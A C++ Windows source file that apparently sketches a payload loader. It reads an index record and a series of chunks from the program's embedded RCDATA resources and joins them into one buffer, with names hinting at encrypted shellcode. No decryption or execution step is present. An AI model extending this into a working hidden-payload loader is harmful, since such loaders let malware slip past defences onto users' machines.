#include <windows.h>
#include <cstdint>
#include <vector>
#include <string>


#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

#define MVAL 0x474E5089

#pragma pack(push, 1)
struct PIndex {
    uint32_t mval = MVAL;
    uint8_t  fkey;
    uint32_t tsize;
    uint16_t ccount;
    uint16_t fchkid;
    uint32_t crc32;
};
#pragma pack(pop)

static const char* resTypeRCDATA = "RCDATA";

unsigned char* LoadResBID(int id, DWORD* size) {    
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) {
        return nullptr;
    }
    
    
 
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), resTypeRCDATA);
    if (!hRes) {
        
        hRes = FindResourceW(hMod, MAKEINTRESOURCEW(id), L"RCDATA");
        if (!hRes) {
        } else {
        }
    } else {
    }
    
    if (!hRes) {
        *size = 0;
        return nullptr;
    }
    
   
    *size = SizeofResource(hMod, hRes);
    if (*size == 0) {
        DWORD err = GetLastError();
        return nullptr;
    }
    
    
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) {
        DWORD err = GetLastError();
        *size = 0;
        return nullptr;
    }
    
    unsigned char* data = (unsigned char*)LockResource(hGlob);
    if (!data) {
        DWORD err = GetLastError();
        *size = 0;
        return nullptr;
    }
        
    return data;
}


std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    
    DWORD iSize = 0;
    unsigned char* idata = LoadResBID(999, &iSize);
    
    if (!idata) {
        return {};
    }
    
    
    if (iSize < sizeof(PIndex)) {
        return {};
    }
    
    PIndex* idx = (PIndex*)idata;
    
    if (idx->mval != MVAL) {
        return {};
    }
    
    std::vector<std::vector<BYTE>> shEChks;
    
    for (int respos = 0; respos < idx->ccount; ++respos) {
        int resId = idx->fchkid + respos;
        DWORD chksize = 0;
        
        unsigned char* encbuf = LoadResBID(resId, &chksize);
        
        if (encbuf && chksize > 0) {
            std::vector<BYTE> chunk(encbuf, encbuf + chksize);
            shEChks.push_back(chunk);
        } else {
            return {};
        }
    }
    
    if (shEChks.size() != idx->ccount) {
        return {};
    }
    return {*idx,shEChks};
}



std::vector<char> RecFWRP() {
    auto [index, enChksLog] = LoadEFR();
    if (enChksLog.empty()) return {};
    
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize);

    for (int i = 0; i < index.ccount; ++i) {
        const auto& chunk = enChksLog[i];
        pbuf.insert(pbuf.end(), chunk.begin(), chunk.end());
    }

    return pbuf;
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
    
     
    return 0;
}